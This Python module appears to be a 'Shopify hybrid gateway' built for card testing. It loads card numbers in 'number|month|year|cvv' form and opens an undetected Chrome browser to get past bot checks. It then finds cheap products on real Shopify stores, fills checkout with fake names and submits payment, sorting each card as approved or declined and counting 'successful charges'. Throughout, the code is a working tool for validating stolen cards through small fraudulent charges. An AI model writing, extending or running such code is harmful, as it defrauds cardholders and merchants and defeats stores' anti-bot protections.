"""
Shopify Hybrid Gateway
Combines: Store Database + Product Finder + Selenium (for checkout only)
Best of both worlds: Speed + Reliability + Bot Bypass
"""

import time
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from typing import Tuple, Optional
from .shopify_store_database import ShopifyStoreDatabase
from .shopify_product_finder import DynamicProductFinder


class ShopifyHybridGateway:
    """
    Hybrid Shopify Gateway:
    - Uses store database for store selection
    - Uses product finder for product IDs
    - Uses Selenium ONLY for checkout/payment
    
    This is faster and more reliable than full Selenium automation
    """
    
    def __init__(self, proxy: Optional[str] = None, headless: bool = True):
        """
        Initialize hybrid gateway
        
        Args:
            proxy: Optional proxy (format: host:port:user:pass)
            headless: Run browser in headless mode
        """
        self.proxy = proxy
        self.headless = headless
        self.driver = None
        
        # Initialize components
        self.store_db = ShopifyStoreDatabase()
        self.product_finder = DynamicProductFinder()
        
        # Load stores
        self.store_db.load_stores()
        
        # Statistics
        self.total_attempts = 0
        self.successful_charges = 0
    
    def _init_browser(self):
        """Initialize browser (only when needed)"""
        if self.driver:
            return
        
        options = uc.ChromeOptions()
        if self.headless:
            options.add_argument('--headless=new')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        
        self.driver = uc.Chrome(options=options, use_subprocess=False)
    
    def _close_browser(self):
        """Close browser"""
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
            self.driver = None
    
    def _navigate_to_product(self, store_url: str, variant_id: int) -> bool:
        """
        Navigate directly to product checkout
        
        Args:
            store_url: Store URL
            variant_id: Product variant ID
        
        Returns:
            True if successful
        """
        try:
            # Direct checkout URL with product
            checkout_url = f"https://{store_url}/cart/{variant_id}:1"
            
            print(f"  → Navigating to checkout: {checkout_url}")
            self.driver.get(checkout_url)
            time.sleep(2)
            
            # Click checkout button
            checkout_selectors = [
                (By.NAME, 'checkout'),
                (By.CSS_SELECTOR, 'button[name="checkout"]'),
                (By.CSS_SELECTOR, 'input[name="checkout"]'),
                (By.CSS_SELECTOR, '[href*="/checkouts"]'),
                (By.XPATH, '//button[contains(text(), "Check out")]'),
                (By.XPATH, '//a[contains(text(), "Check out")]'),
            ]
            
            for by, selector in checkout_selectors:
                try:
                    element = WebDriverWait(self.driver, 3).until(
                        EC.presence_of_element_located((by, selector))
                    )
                    element.click()
                    print(f"  ✓ Clicked checkout button")
                    time.sleep(3)
                    return True
                except:
                    continue
            
            # If no button found, might already be on checkout
            if '/checkouts/' in self.driver.current_url:
                print(f"  ✓ Already on checkout page")
                return True
            
            return False
            
        except Exception as e:
            print(f"  ✗ Navigation error: {e}")
            return False
    
    def _fill_checkout_form(self, card_data: str) -> bool:
        """
        Fill checkout form with card details
        
        Args:
            card_data: Card in format "number|month|year|cvv"
        
        Returns:
            True if successful
        """
        try:
            parts = card_data.split('|')
            if len(parts) != 4:
                return False
            
            card_number, exp_month, exp_year, cvv = parts
            
            # Wait for checkout page
            time.sleep(2)
            
            # Fill email
            try:
                email_field = self.driver.find_element(By.CSS_SELECTOR, 'input[type="email"]')
                email_field.send_keys(f"test{int(time.time())}@example.com")
                print(f"  ✓ Filled email")
            except:
                pass
            
            # Fill shipping address (simple version)
            try:
                first_name = self.driver.find_element(By.NAME, 'firstName')
                first_name.send_keys('John')
                
                last_name = self.driver.find_element(By.NAME, 'lastName')
                last_name.send_keys('Doe')
                
                address = self.driver.find_element(By.NAME, 'address1')
                address.send_keys('123 Main St')
                
                city = self.driver.find_element(By.NAME, 'city')
                city.send_keys('New York')
                
                zip_code = self.driver.find_element(By.NAME, 'postalCode')
                zip_code.send_keys('10001')
                
                print(f"  ✓ Filled shipping address")
            except:
                print(f"  ⚠️  Could not fill shipping (may not be required)")
            
            # Continue to payment
            try:
                continue_btn = self.driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]')
                continue_btn.click()
                time.sleep(3)
                print(f"  ✓ Continued to payment")
            except:
                pass
            
            # Fill card details
            try:
                # Try multiple card field selectors
                card_selectors = [
                    (By.NAME, 'number'),
                    (By.ID, 'number'),
                    (By.CSS_SELECTOR, 'input[placeholder*="Card number"]'),
                    (By.CSS_SELECTOR, 'input[placeholder*="card number"]'),
                    (By.CSS_SELECTOR, 'input[autocomplete="cc-number"]'),
                    (By.CSS_SELECTOR, 'input[data-card-number]'),
                ]
                
                # Check if we need to switch to iframe
                iframes = self.driver.find_elements(By.TAG_NAME, 'iframe')
                in_iframe = False
                
                # Try to find card field in main page first
                card_field = None
                for by, selector in card_selectors:
                    try:
                        card_field = self.driver.find_element(by, selector)
                        if card_field:
                            break
                    except:
                        continue
                
                # If not found, try iframes
                if not card_field:
                    for iframe in iframes:
                        try:
                            self.driver.switch_to.frame(iframe)
                            in_iframe = True
                            
                            for by, selector in card_selectors:
                                try:
                                    card_field = self.driver.find_element(by, selector)
                                    if card_field:
                                        break
                                except:
                                    continue
                            
                            if card_field:
                                break
                            else:
                                self.driver.switch_to.default_content()
                                in_iframe = False
                        except:
                            self.driver.switch_to.default_content()
                            in_iframe = False
                            continue
                
                if not card_field:
                    print(f"  ✗ Could not find card number field")
                    return False
                
                # Fill card number
                card_field.clear()
                card_field.send_keys(card_number)
                time.sleep(0.5)
                
                # Fill expiry
                exp_selectors = [
                    (By.NAME, 'expiry'),
                    (By.ID, 'expiry'),
                    (By.CSS_SELECTOR, 'input[placeholder*="MM"]'),
                    (By.CSS_SELECTOR, 'input[placeholder*="Expiry"]'),
                    (By.CSS_SELECTOR, 'input[autocomplete="cc-exp"]'),
                ]
                
                exp_field = None
                for by, selector in exp_selectors:
                    try:
                        exp_field = self.driver.find_element(by, selector)
                        if exp_field:
                            break
                    except:
                        continue
                
                if exp_field:
                    exp_field.clear()
                    exp_field.send_keys(f"{exp_month}{exp_year}")
                    time.sleep(0.5)
                
                # Fill CVV
                cvv_selectors = [
                    (By.NAME, 'verification_value'),
                    (By.NAME, 'cvv'),
                    (By.ID, 'cvv'),
                    (By.CSS_SELECTOR, 'input[placeholder*="CVV"]'),
                    (By.CSS_SELECTOR, 'input[placeholder*="Security"]'),
                    (By.CSS_SELECTOR, 'input[autocomplete="cc-csc"]'),
                ]
                
                cvv_field = None
                for by, selector in cvv_selectors:
                    try:
                        cvv_field = self.driver.find_element(by, selector)
                        if cvv_field:
                            break
                    except:
                        continue
                
                if cvv_field:
                    cvv_field.clear()
                    cvv_field.send_keys(cvv)
                    time.sleep(0.5)
                
                # Switch back to main content if we were in iframe
                if in_iframe:
                    self.driver.switch_to.default_content()
                
                print(f"  ✓ Filled card details")
                return True
                
            except Exception as e:
                print(f"  ✗ Card fill error: {e}")
                if in_iframe:
                    try:
                        self.driver.switch_to.default_content()
                    except:
                        pass
                return False
            
        except Exception as e:
            print(f"  ✗ Form fill error: {e}")
            return False
    
    def _submit_payment(self) -> Tuple[str, str]:
        """
        Submit payment and detect result
        
        Returns:
            (status, message)
        """
        try:
            # Click pay button
            pay_selectors = [
                (By.CSS_SELECTOR, 'button[type="submit"]'),
                (By.CSS_SELECTOR, '#continue_button'),
                (By.XPATH, '//button[contains(text(), "Pay")]'),
                (By.XPATH, '//button[contains(text(), "Complete")]'),
            ]
            
            for by, selector in pay_selectors:
                try:
                    button = self.driver.find_element(by, selector)
                    button.click()
                    print(f"  ✓ Clicked pay button")
                    break
                except:
                    continue
            
            # Wait for result
            time.sleep(5)
            
            # Check URL and content
            current_url = self.driver.current_url.lower()
            page_source = self.driver.page_source.lower()
            
            # Success indicators
            success_keywords = [
                'thank you', 'order confirmed', 'order complete',
                'payment successful', 'order received', 'confirmation',
                '/thank_you', '/orders/', 'order number'
            ]
            
            # Decline indicators
            decline_keywords = [
                'declined', 'insufficient funds', 'invalid card',
                'payment failed', 'card was declined', 'transaction failed',
                'incorrect', 'expired', 'do not honor'
            ]
            
            # Check for success
            for keyword in success_keywords:
                if keyword in current_url or keyword in page_source:
                    return 'approved', f'Payment successful (detected: {keyword})'
            
            # Check for decline
            for keyword in decline_keywords:
                if keyword in page_source:
                    return 'declined', f'Card declined (detected: {keyword})'
            
            # Unknown result
            return 'error', 'Could not determine result'
            
        except Exception as e:
            return 'error', f'Payment submission error: {e}'
    
    def check(self, card_data: str, max_attempts: int = 3) -> Tuple[str, str, str]:
        """
        Check card using hybrid approach
        
        Args:
            card_data: Card in format "number|month|year|cvv"
            max_attempts: Maximum stores to try
        
        Returns:
            (status, message, card_type)
        """
        self.total_attempts += 1
        
        # Parse card
        try:
            parts = card_data.split('|')
            if len(parts) != 4:
                return 'error', 'Invalid card format', 'Unknown'
            
            card_number = parts[0].strip()
            
            # Determine card type
            if card_number.startswith('4'):
                card_type = 'Visa'
            elif card_number.startswith('5'):
                card_type = 'Mastercard'
            elif card_number.startswith('3'):
                card_type = 'Amex'
            else:
                card_type = 'Unknown'
            
        except:
            return 'error', 'Card parsing error', 'Unknown'
        
        # Try multiple stores
        for attempt in range(max_attempts):
            try:
                print(f"\n[Attempt {attempt + 1}/{max_attempts}]")
                
                # Step 1: Get store with product (using database + product finder)
                print(f"  → Finding store with product...")
                
                # Get stores in price range $0.01 - $5
                stores = self.store_db.get_stores_by_price_range(0.01, 5.00)
                if not stores:
                    stores = self.store_db.stores[:50]  # Fallback to any stores
                
                # Try to find a store with a product
                store_url = None
                variant_id = None
                
                for store in stores[attempt*3:(attempt+1)*3]:  # Try 3 stores per attempt
                    store_url = store['url']
                    
                    # Find product
                    product = self.product_finder.find_product_at_price(store_url, 1.00, 4.00)
                    if not product:
                        product = self.product_finder.get_cheapest_product(store_url)
                    
                    if product:
                        variant_id = product['variant_id']
                        print(f"  ✓ Found: {store_url} - {product['title']} (${product['price']})")
                        break
                
                if not store_url or not variant_id:
                    print(f"  ✗ No products found")
                    continue
                
                # Step 2: Use Selenium for checkout only
                print(f"  → Initializing browser...")
                self._init_browser()
                
                # Navigate to product checkout
                if not self._navigate_to_product(store_url, variant_id):
                    print(f"  ✗ Navigation failed")
                    self._close_browser()
                    continue
                
                # Fill checkout form
                if not self._fill_checkout_form(card_data):
                    print(f"  ✗ Form fill failed")
                    self._close_browser()
                    continue
                
                # Submit payment
                status, message = self._submit_payment()
                
                # Close browser
                self._close_browser()
                
                # Handle result
                if status == 'approved':
                    self.successful_charges += 1
                    return status, f"{message} | Store: {store_url}", card_type
                elif status == 'declined':
                    return status, message, card_type
                else:
                    print(f"  ✗ {message}")
                    continue
                
            except Exception as e:
                print(f"  ✗ Error: {e}")
                self._close_browser()
                continue
        
        return 'error', 'All attempts failed', card_type
    
    def get_stats(self):
        """Get statistics"""
        return {
            'total_attempts': self.total_attempts,
            'successful_charges': self.successful_charges,
            'success_rate': f"{(self.successful_charges / self.total_attempts * 100):.1f}%" if self.total_attempts > 0 else "0%"
        }


if __name__ == "__main__":
    print("="*70)
    print("SHOPIFY HYBRID GATEWAY TEST")
    print("="*70)
    print("\nThis uses:")
    print("  1. Store database for store selection")
    print("  2. Product finder for product IDs")
    print("  3. Selenium ONLY for checkout/payment")
    print("\nThis is faster and more reliable than full Selenium!\n")
    
    gateway = ShopifyHybridGateway(headless=True)
    
    # Test card
    test_card = "4111111111111111|12|25|123"
    
    print(f"Testing card: {test_card[:4]}...{test_card[-7:]}\n")
    
    status, message, card_type = gateway.check(test_card, max_attempts=2)
    
    print(f"\n{'='*70}")
    print(f"RESULT:")
    print(f"  Status: {status}")
    print(f"  Message: {message}")
    print(f"  Card Type: {card_type}")
    print(f"{'='*70}")
    
    stats = gateway.get_stats()
    print(f"\nStatistics:")
    for key, value in stats.items():
        print(f"  {key}: {value}")
